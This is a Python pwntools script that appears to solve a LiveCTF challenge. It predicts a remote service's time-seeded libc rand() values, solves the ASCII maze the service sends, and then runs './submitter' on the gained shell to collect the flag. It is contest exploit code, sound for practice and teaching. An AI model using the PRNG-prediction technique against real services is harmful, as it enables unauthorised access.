#!/usr/bin/env/python
# powerprove

from pwn import *
from ctypes import *

rand_count = 0
real_path = ''

def menu(index):
    s.recvuntil(b'orment:')
    s.sendline(index)

def solve_maze(maze):
    start = find_start(maze)
    if start:
        rows, cols = len(maze), len(maze[0])
        visited = [[False] * cols for _ in range(rows)]
        path = []

        if dfs(maze, start[0], start[1], visited, path):
            print_path(maze, path)
        else:
            pass
    else:
        pass

def find_start(maze):
    for i in range(len(maze)):
        for j in range(len(maze[i])):
            if maze[i][j] == '@':
                return (i, j)
    return None

def dfs(maze, row, col, visited, path):
    if maze[row][col] == '*':  
        path.append((row, col))
        real_path = path
        print_directions(path)
        return True

    if maze[row][col] == '#' or visited[row][col]:
        return False

    rows, cols = len(maze), len(maze[0])
    if row < 0 or row >= rows or col < 0 or col >= cols:  
        return False

    visited[row][col] = True  
    path.append((row, col))  

    
    if dfs(maze, row - 1, col, visited, path) or \
            dfs(maze, row + 1, col, visited, path) or \
            dfs(maze, row, col - 1, visited, path) or \
            dfs(maze, row, col + 1, visited, path):
        return True

    path.pop()  
    return False

def print_path(maze, path):
    for i in range(len(maze)):
        for j in range(len(maze[i])):
            if (i, j) in path:
                pass
                #print('*', end='')
            else:
                pass
                #print(maze[i][j], end='')
        


def print_directions(path):
    payload = b''
    for i in range(1, len(path)):
        prev_pos = path[i - 1]
        curr_pos = path[i]
        direction = ''

        if curr_pos[0] == prev_pos[0] and curr_pos[1] == prev_pos[1] + 1:
            direction = 'e'  
            payload += b'e' 
        elif curr_pos[0] == prev_pos[0] and curr_pos[1] == prev_pos[1] - 1:
            direction = 'w'  
            payload += b'w'
        elif curr_pos[0] == prev_pos[0] + 1 and curr_pos[1] == prev_pos[1]:
            direction = 's'  
            payload += b's'
        elif curr_pos[0] == prev_pos[0] - 1 and curr_pos[1] == prev_pos[1]:
            direction = 'n'  
            payload += b'n'

        


    global rand_count

    for i in payload[:-1]:
        #s.recvuntil(b'orment:')
        s.sendline(chr(i).encode())
        rand_count += 1
        lib.rand()

    rand_count += 1
    lib.rand()
    while True:
        rand = lib.rand()
        rand_count += 1
        #s.recvuntil(b'orment:')
        s.sendline(b'n')
        if (int(rand) % 1213 == 1212):  
            s.sendline(chr(payload[-1]).encode())
            s.recvuntil(b"the maze!")
            s.sendline(b'./submitter')
            flag = s.recvline_contains(b'LiveCTF{').decode().strip()
            log.info('Flag: %s', flag)
            s.close()
            break


HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

s = remote(HOST, int(PORT))
#s = remote("localhost", 4000)
lib = CDLL("/lib/x86_64-linux-gnu/libc.so.6") # libc addres
#lib = CDLL("./libc.so.6")
lib.srand(lib.time(0))
for i in range(0x24f):
    rand_count += 1
    lib.rand()

menu(b'a')

s.recvuntil(b'maze.\n')
maze = s.recvuntil(b'\nY')[:-2].decode()
maze = maze.split('\n')

path = solve_maze(maze)
